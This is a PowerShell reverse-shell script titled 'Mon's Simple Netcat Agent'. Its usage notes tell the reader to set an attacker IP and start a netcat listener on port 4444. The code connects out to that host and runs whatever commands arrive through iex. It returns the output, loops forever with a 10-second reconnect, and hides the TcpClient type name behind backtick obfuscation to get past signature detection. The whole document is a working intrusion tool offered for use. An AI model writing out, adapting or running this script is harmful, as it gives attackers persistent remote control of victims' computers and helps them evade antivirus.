
<#
========================= Mon's Simple Netcat Agent ============================

USAGE
1. Download Ncat For windows. https://nmap.org/download#windows
2. Change "YOUR IP HERE" to the attacker machine's ipv4 address (find using ipconfig on windows)
3. Open a terminal on the attacker machine and type "nc -lvp 4444"
4. Run this script on the client machine.

#>

do{
$v = 4
$a = New-Object S`ySt`em.N`eT.`s`ock`eTs.TC`PC`li`eNt("YOUR IP HERE",4444)
$b = $a.GetStream();[byte[]]$c = 0..65535|%{0}
while(($d = $b.Read($c, 0, $c.Length)) -ne 0){
$e = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($c,0, $d)
$f = (iex $e 2>&1 | Out-String );$g = $f + (pwd).Path + '> '
$h = ([text.encoding]::ASCII).GetBytes($g)
$b.Write($h,0,$h.Length)
$b.Flush()}
$a.Close()
Sleep 10
}while ($v -le 5)
